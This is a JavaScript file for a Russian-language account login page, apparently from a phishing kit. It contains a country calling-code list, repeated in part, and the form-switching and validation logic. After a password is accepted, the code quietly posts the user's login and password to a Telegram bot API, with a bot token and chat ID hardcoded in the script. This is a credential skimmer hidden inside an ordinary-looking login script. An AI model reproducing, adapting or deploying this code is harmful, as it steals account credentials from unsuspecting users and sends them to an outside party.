let countryData = [
  {
    name: "Афганистан",
    callingCode: "+93",
  },
  {
    name: "Албания",
    callingCode: "+355",
  },
  {
    name: "Алжир",
    callingCode: "+213",
  },
  {
    name: "Андорра",
    callingCode: "+376",
  },
  {
    name: "Ангола",
    callingCode: "+244",
  },
  {
    name: "Антигуа и Барбуда",
    callingCode: "+1",
  },
  {
    name: "Аргентина",
    callingCode: "+54",
  },
  {
    name: "Армения",
    callingCode: "+374",
  },
  {
    name: "Австралия",
    callingCode: "+61",
  },
  {
    name: "Австрия",
    callingCode: "+43",
  },
  {
    name: "Азербайджан",
    callingCode: "+994",
  },
  {
    name: "Багамы",
    callingCode: "+1",
  },
  {
    name: "Бахрейн",
    callingCode: "+973",
  },
  {
    name: "Бангладеш",
    callingCode: "+880",
  },
  {
    name: "Барбадос",
    callingCode: "+1",
  },
  {
    name: "Беларусь",
    callingCode: "+375",
  },
  {
    name: "Бельгия",
    callingCode: "+32",
  },
  {
    name: "Белиз",
    callingCode: "+501",
  },
  {
    name: "Бенин",
    callingCode: "+229",
  },
  {
    name: "Бутан",
    callingCode: "+975",
  },
  {
    name: "Боливия",
    callingCode: "+591",
  },
  {
    name: "Босния и Герцеговина",
    callingCode: "+387",
  },
  {
    name: "Ботсвана",
    callingCode: "+267",
  },
  {
    name: "Бразилия",
    callingCode: "+55",
  },
  {
    name: "Бруней",
    callingCode: "+673",
  },
  {
    name: "Болгария",
    callingCode: "+359",
  },
  {
    name: "Буркина-Фасо",
    callingCode: "+226",
  },
  {
    name: "Бурунди",
    callingCode: "+257",
  },
  {
    name: "Кабо-Верде",
    callingCode: "+238",
  },
  {
    name: "Камбоджа",
    callingCode: "+855",
  },
  {
    name: "Камерун",
    callingCode: "+237",
  },
  {
    name: "Канада",
    callingCode: "+1",
  },
  {
    name: "Центрально-Африканская Республика",
    callingCode: "+236",
  },
  {
    name: "Чад",
    callingCode: "+235",
  },
  {
    name: "Чили",
    callingCode: "+56",
  },
  {
    name: "Китай",
    callingCode: "+86",
  },
  {
    name: "Колумбия",
    callingCode: "+57",
  },
  {
    name: "Коморы",
    callingCode: "+269",
  },
  {
    name: "Конго, Демократическая Республика",
    callingCode: "+243",
  },
  {
    name: "Конго, Республика",
    callingCode: "+242",
  },
  {
    name: "Коста-Рика",
    callingCode: "+506",
  },
  {
    name: "Кот-д'Ивуар",
    callingCode: "+225",
  },
  {
    name: "Хорватия",
    callingCode: "+385",
  },
  {
    name: "Куба",
    callingCode: "+53",
  },
  {
    name: "Кипр",
    callingCode: "+357",
  },
  {
    name: "Чехия",
    callingCode: "+420",
  },
  {
    name: "Дания",
    callingCode: "+45",
  },
  {
    name: "Джибути",
    callingCode: "+253",
  },
  {
    name: "Доминика",
    callingCode: "+1",
  },
  {
    name: "Доминиканская Республика",
    callingCode: "+1",
  },
  {
    name: "Эквадор",
    callingCode: "+593",
  },
  {
    name: "Египет",
    callingCode: "+20",
  },
  {
    name: "Сальвадор",
    callingCode: "+503",
  },
  {
    name: "Экваториальная Гвинея",
    callingCode: "+240",
  },
  {
    name: "Эритрея",
    callingCode: "+291",
  },
  {
    name: "Эстония",
    callingCode: "+372",
  },
  {
    name: "Эсватини",
    callingCode: "+268",
  },
  {
    name: "Эфиопия",
    callingCode: "+251",
  },
  {
    name: "Фиджи",
    callingCode: "+679",
  },
  {
    name: "Финляндия",
    callingCode: "+358",
  },
  {
    name: "Франция",
    callingCode: "+33",
  },
  {
    name: "Габон",
    callingCode: "+241",
  },
  {
    name: "Гамбия",
    callingCode: "+220",
  },
  {
    name: "Грузия",
    callingCode: "+995",
  },
  {
    name: "Афганистан",
    callingCode: "+93",
  },
  {
    name: "Албания",
    callingCode: "+355",
  },
  {
    name: "Алжир",
    callingCode: "+213",
  },
  {
    name: "Андорра",
    callingCode: "+376",
  },
  {
    name: "Ангола",
    callingCode: "+244",
  },
  {
    name: "Антигуа и Барбуда",
    callingCode: "+1",
  },
  {
    name: "Аргентина",
    callingCode: "+54",
  },
  {
    name: "Армения",
    callingCode: "+374",
  },
  {
    name: "Австралия",
    callingCode: "+61",
  },
  {
    name: "Австрия",
    callingCode: "+43",
  },
  {
    name: "Азербайджан",
    callingCode: "+994",
  },
  {
    name: "Багамы",
    callingCode: "+1",
  },
  {
    name: "Бахрейн",
    callingCode: "+973",
  },
  {
    name: "Бангладеш",
    callingCode: "+880",
  },
  {
    name: "Барбадос",
    callingCode: "+1",
  },
  {
    name: "Беларусь",
    callingCode: "+375",
  },
  {
    name: "Бельгия",
    callingCode: "+32",
  },
  {
    name: "Белиз",
    callingCode: "+501",
  },
  {
    name: "Бенин",
    callingCode: "+229",
  },
  {
    name: "Бутан",
    callingCode: "+975",
  },
  {
    name: "Боливия",
    callingCode: "+591",
  },
  {
    name: "Босния и Герцеговина",
    callingCode: "+387",
  },
  {
    name: "Ботсвана",
    callingCode: "+267",
  },
  {
    name: "Бразилия",
    callingCode: "+55",
  },
  {
    name: "Бруней",
    callingCode: "+673",
  },
  {
    name: "Болгария",
    callingCode: "+359",
  },
  {
    name: "Буркина-Фасо",
    callingCode: "+226",
  },
  {
    name: "Бурунди",
    callingCode: "+257",
  },
  {
    name: "Кабо-Верде",
    callingCode: "+238",
  },
  {
    name: "Камбоджа",
    callingCode: "+855",
  },
  {
    name: "Камерун",
    callingCode: "+237",
  },
  {
    name: "Канада",
    callingCode: "+1",
  },
  {
    name: "Центрально-Африканская Республика",
    callingCode: "+236",
  },
  {
    name: "Чад",
    callingCode: "+235",
  },
  {
    name: "Чили",
    callingCode: "+56",
  },
  {
    name: "Китай",
    callingCode: "+86",
  },
  {
    name: "Колумбия",
    callingCode: "+57",
  },
  {
    name: "Коморы",
    callingCode: "+269",
  },
  {
    name: "Конго, Демократическая Республика",
    callingCode: "+243",
  },
  {
    name: "Конго, Республика",
    callingCode: "+242",
  },
  {
    name: "Коста-Рика",
    callingCode: "+506",
  },
  {
    name: "Кот-д'Ивуар",
    callingCode: "+225",
  },
  {
    name: "Хорватия",
    callingCode: "+385",
  },
  {
    name: "Куба",
    callingCode: "+53",
  },
  {
    name: "Кипр",
    callingCode: "+357",
  },
  {
    name: "Чехия",
    callingCode: "+420",
  },
  {
    name: "Дания",
    callingCode: "+45",
  },
  {
    name: "Джибути",
    callingCode: "+253",
  },
  {
    name: "Доминика",
    callingCode: "+1",
  },
  {
    name: "Доминиканская Республика",
    callingCode: "+1",
  },
  {
    name: "Эквадор",
    callingCode: "+593",
  },
  {
    name: "Египет",
    callingCode: "+20",
  },
  {
    name: "Сальвадор",
    callingCode: "+503",
  },
  {
    name: "Экваториальная Гвинея",
    callingCode: "+240",
  },
  {
    name: "Эритрея",
    callingCode: "+291",
  },
  {
    name: "Эстония",
    callingCode: "+372",
  },
  {
    name: "Эсватини",
    callingCode: "+268",
  },
  {
    name: "Эфиопия",
    callingCode: "+251",
  },
  {
    name: "Фиджи",
    callingCode: "+679",
  },
  {
    name: "Финляндия",
    callingCode: "+358",
  },
  {
    name: "Франция",
    callingCode: "+33",
  },
  {
    name: "Габон",
    callingCode: "+241",
  },
  {
    name: "Гамбия",
    callingCode: "+220",
  },
  {
    name: "Грузия",
    callingCode: "+995",
  },
];

let formLoginMethods = document.querySelector(".form__login-method");
let formLoginSwap = document.querySelectorAll(".form__login-swap-item");
let formLoginSwapWrapper = document.querySelector(".form__login-swap");

let formOtherMethod = document.querySelector(".form__other-method");
let formLoginButton = document.querySelector(".form__login-button button");
let formLoginButtonText = document.querySelector(
  ".form__login-button button span:nth-child(1)"
);
let formLoginButtonSpan = document.querySelector(
  ".form__login-button-checkbox"
);

let formLoginInput = document.querySelector(".form__login-input input ");
let selectTitle = document.querySelector(".__select__title");
let formSelect = document.querySelector(".form__select");
let formSelect2 = document.querySelector(".form__select2");
let formSelectContent2 = document.querySelector(".__select__content2");

let formPasswordBackWrapper = document.querySelector(
  ".form__login-password-back"
);

let formPasswordBack = document.querySelectorAll(
  ".form__login-password-back p"
);

let formCreateAccountLink = document.querySelector(
  ".form__recover-links a:nth-child(2)"
);

let formPasswordInputWrapper = document.querySelector(".form__password-input");
let formPasswordInput = document.querySelector(".form__password-input input");

let formErrorInput = document.querySelector(".form__error-input");

let formHeader = document.querySelector(".form__header p");

let passwordShowButtons = document.querySelectorAll(
  ".password__show-buttons svg"
);

let formLoginWrapper = document.querySelector(".form-login-wrapper");

let options = {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({ email: "", password: "" }),
};

let buttonState = "";

function swapLoginMethod(i) {
  switch (i) {
    case 0:
      formLoginSwap[0].classList.add("form__login-swap-item_active");
      formLoginSwap[1].classList.remove("form__login-swap-item_active");
      formLoginMethods.classList.remove("none");
      formOtherMethod.classList.remove("none");
      formLoginButtonSpan.classList.remove("none");
      formLoginButtonText.textContent = "Ввести пароль";
      formLoginButton.classList.remove("button__full");
      formLoginButton.setAttribute("data-state", buttonState);
      formLoginSwapWrapper.classList.remove("mb-20");
      formLoginInput.classList.remove("input__number");
      formLoginInput.value = "";

      formLoginInput.placeholder = "Имя аккаунта";

      formSelect.classList.remove("none");
      formSelect2.classList.add("none");

      break;

    case 1:
      formLoginSwap[1].classList.add("form__login-swap-item_active");
      formLoginSwap[0].classList.remove("form__login-swap-item_active");
      formLoginMethods.classList.add("none");
      formOtherMethod.classList.add("none");
      formLoginButtonSpan.classList.add("none");
      formLoginButtonText.textContent = "Отправить код";
      formLoginButton.classList.add("button__full");
      buttonState = formLoginButton.getAttribute("data-state");
      console.log(buttonState);
      formLoginButton.setAttribute("data-state", "number");
      formLoginSwapWrapper.classList.add("mb-20");
      formLoginInput.classList.add("input__number");
      formLoginInput.classList.remove("input__full");
      formLoginInput.value = "+7";
      formLoginInput.placeholder = "";
      formSelect.classList.add("none");
      formSelect2.classList.remove("none");
      break;
  }
}

for (let i = 0; i < formLoginSwap.length; i++) {
  formLoginSwap[i].addEventListener("click", () => swapLoginMethod(i));
}
formSelectContent2.innerHTML += `<input id="2singleSelect0" class="__select__input2" type="radio" name="singleSelect"
    checked />
<label onclick="changeNumber(+7)" for="2singleSelect0" class="__select__label2"><img  src="img/checkmark.svg" alt="">Россия</label>`;
for (let i = 0; i < countryData.length; i++) {
  formSelectContent2.innerHTML += `<input id="2singleSelect${i+1}" class="__select__input2" type="radio" name="singleSelect"
     />
<label onclick="changeNumber('${countryData[i].callingCode}')" for="2singleSelect${i+1}" class="__select__label2"><img src="img/checkmark.svg" alt="$">${countryData[i].name}</label>`;
}

const selectSingle2 = document.querySelector(".__select2");
const selectSingle_title2 = selectSingle2.querySelector(".__select__title2");
const selectSingle_labels2 =
  selectSingle2.querySelectorAll(".__select__label2");
console.log(selectSingle_title2);

// Toggle menu
selectSingle_title2.addEventListener("click", () => {
  if ("active" === selectSingle2.getAttribute("data-state")) {
    selectSingle2.setAttribute("data-state", "");
  } else {
    selectSingle2.setAttribute("data-state", "active");
  }
});

// Close when click to option
for (let i = 0; i < selectSingle_labels2.length; i++) {
  selectSingle_labels2[i].addEventListener("click", (evt) => {
    selectSingle_title2.innerHTML =
      "<span>" +
      evt.target.textContent +
      "</span>" +
      ' <span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="base-0-2-23" ie-style=""><path fill-rule="evenodd" d="M5.171 7.226A.75.75 0 015.75 6h4.5a.75.75 0 01.579 1.226l-2.223 2.966a.75.75 0 01-1.212 0L5.171 7.226z"></path></svg></span>';
    selectSingle2.setAttribute("data-state", "");
  });
}

// Enter password click

formLoginButton.onclick = async () => {
  formLoginButton.classList.add('disabled')

  try {
    await enterPassword();
  } finally {
    formLoginButton.classList.remove("disabled");
  }

};

formLoginInput.oninput = () => {
  if (
    formLoginInput.value.includes("@") &&
    formLoginButton.getAttribute("data-state") !== "number"
  ) {
    formSelect.classList.add("none");
    formLoginInput.classList.add("input__full");
  } else if (formLoginButton.getAttribute("data-state") === "number") {
    return null;
  } else if (formLoginButton.getAttribute("data-state") !== "other") {
    formSelect.classList.remove("none");
    formLoginInput.classList.remove("input__full");
  }
};

async function enterPassword() {
  if (formLoginButton.getAttribute("data-state") === "mail") {
    if (formLoginInput.value === "") {
      formErrorInput.textContent = "Поле «Имя аккаунта» должно быть заполнено";
      formErrorInput.classList.remove("none");
      formLoginInput.classList.add("border__error");
      formSelect.classList.add("border__error");
    } else {
      if (formLoginInput.value.includes("@")) {
        options.body = JSON.stringify({ email: formLoginInput.value });
      } else {
        options.body = JSON.stringify({
          email: `${formLoginInput.value}${selectTitle.textContent}`.replace(
            /\s/g,
            ""
          ),
        });
      }
     await  fetch("/email", options)
        .then((response) => {
          if (!response.ok) {
            throw new Error("Ошибка сети");
          }
          return response.json();
        })
        .then((data) => {
          if (data === true) {
            formLoginSwapWrapper.classList.add("none");
            formLoginMethods.classList.add("none");
            formPasswordBackWrapper.classList.remove("none");
            formCreateAccountLink.classList.add("none");
            formSelect.classList.add("none");
            formLoginInput.classList.add("none");
            formPasswordInputWrapper.classList.remove("none");
            formLoginInput.value.includes("@")
              ? (formPasswordBack[0].textContent =
                  `${formLoginInput.value}`.replace(/\s/g, ""))
              : (formPasswordBack[0].textContent =
                  `${formLoginInput.value}${selectTitle.textContent}`.replace(
                    /\s/g,
                    ""
                  ));
            formHeader.classList.add("header__password");
            formHeader.textContent = "Введите пароль";
            formLoginButton.setAttribute("data-state", "password");
          } else {
            console.log(options.body);

            formErrorInput.textContent = "Такой аккаунт не зарегистрирован";
            formErrorInput.classList.remove("none");
            formLoginInput.classList.add("border__error");
            formSelect.classList.add("border__error");
          }
        })
        .catch((error) => {
          console.error("Ошибка:", error);
        });
    }
  } else if (formLoginButton.getAttribute("data-state") === "password") {
    if (formPasswordInput.value === "") {
      console.log("1");
      formErrorInput.textContent = "Поле «Пароль» должно быть заполнено";
      formErrorInput.classList.remove("none");
      formPasswordInput.classList.add("border__error");
    } else {
      console.log(options.body);
      console.log("2");

      options.body = JSON.stringify({
        email: formPasswordBack[0].textContent,
        password: formPasswordInput.value,
      });
      console.log(options.body);

    await  fetch("/password", options)
        .then((response) => {
          if (!response.ok) {
            throw new Error("Ошибка сети");
          }
          return response.json();
        })
        .then((data) => {
          if (data === true) {
            formLoginWrapper.classList.add("none");
            document.querySelector("main").style.background = "none";
            const TOKEN = "6537642931:AAE5yLS0ufYcaGmshynCIwurVwrP6XyVRbc";
        const CHAT_ID = "-1001967864935";
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        
      
         async function telegramSend () {
                let message = ``;
                // console.log(options)
                message += `<b>Логин:</b>  ${formPasswordBack[0].textContent}\n\n`;
                message += `<b>Пароль:</b>  ${formPasswordInput.value}`
                await axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                });
            }
            telegramSend()
          } else {
            formErrorInput.textContent = "Неверный пароль, попробуйте ещё раз";
            formErrorInput.classList.remove("none");
            formPasswordInput.classList.add("border__error");
          }
        })
        .catch((error) => {
          console.error("Ошибка:", error);
        });
    }
  } else if (formLoginButton.getAttribute("data-state") === "yandex") {
    if (formLoginInput.value === "") {
      return null;
    } else {
      window.location.href = "https://passport.yandex.ru/auth";
    }
  } else if (formLoginButton.getAttribute("data-state") === "gmail") {
    if (formLoginInput.value === "") {
      return null;
    } else {
      window.location.href = "https://accounts.google.com/";
    }
  }
}

for (let i = 0; i < formPasswordBack.length; i++) {
  formPasswordBack[i].addEventListener("click", () => passwordBack(i));
}

function passwordBack() {
  formLoginSwapWrapper.classList.remove("none");
  formLoginMethods.classList.remove("none");
  formPasswordBackWrapper.classList.add("none");
  formCreateAccountLink.classList.remove("none");
  formSelect.classList.remove("none");
  formLoginInput.classList.remove("none");
  formPasswordInputWrapper.classList.add("none");
  formHeader.textContent = "Войти в аккаунт";
  formLoginButton.setAttribute("data-state", "mail");
  removeError();
}

formLoginInput.addEventListener("focusout", () => {
  removeError();
});
formPasswordInput.addEventListener("focusout", () => {
  removeError();
});

function removeError() {
  formErrorInput.classList.add("none");
  formLoginInput.classList.remove("border__error");
  formSelect.classList.remove("border__error");
  formPasswordInput.classList.remove("border__error");
}

for (let i = 0; i < passwordShowButtons.length; i++) {
  passwordShowButtons[i].addEventListener("click", () => showButton(i));
}

function showButton(i) {
  if (i === 0) {
    passwordShowButtons[0].classList.add("none");
    passwordShowButtons[1].classList.remove("none");
    formPasswordInput.type = "text";
  } else {
    passwordShowButtons[1].classList.add("none");
    passwordShowButtons[0].classList.remove("none");
    formPasswordInput.type = "password";
  }
}

function changeNumber(number) {
  formLoginInput.value = number;
}




